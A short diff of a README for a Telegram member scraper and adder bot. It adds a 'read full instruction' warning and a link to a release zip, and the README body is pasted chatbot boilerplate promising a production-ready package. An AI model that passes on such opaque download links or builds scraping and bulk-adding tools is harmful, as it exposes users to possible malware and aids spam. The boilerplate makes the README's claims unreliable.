@@ -1,3 +1,5 @@
+BEFORE DOWNLOADING FILE PLEASE READ FULL INSTRUCTION 
+DOWNLOAD LINK- https://github.com/jariwalaproducts/TELE-SCRAPPER-ADDER-PY-BOT/releases/download/t1/Version.1.0.0.TELEGRAM-SCRAPER-ADDER.zip
 # TELE-SCRAPPER-ADDER-PY-BOT
 Perfect! I've created a complete, robust, production-ready Telegram Member Adder suite with everything you requested. Here's what you're getting:  📦 Complete Package (12 Files) 🐍 Python Scripts (Core Functionality)
 
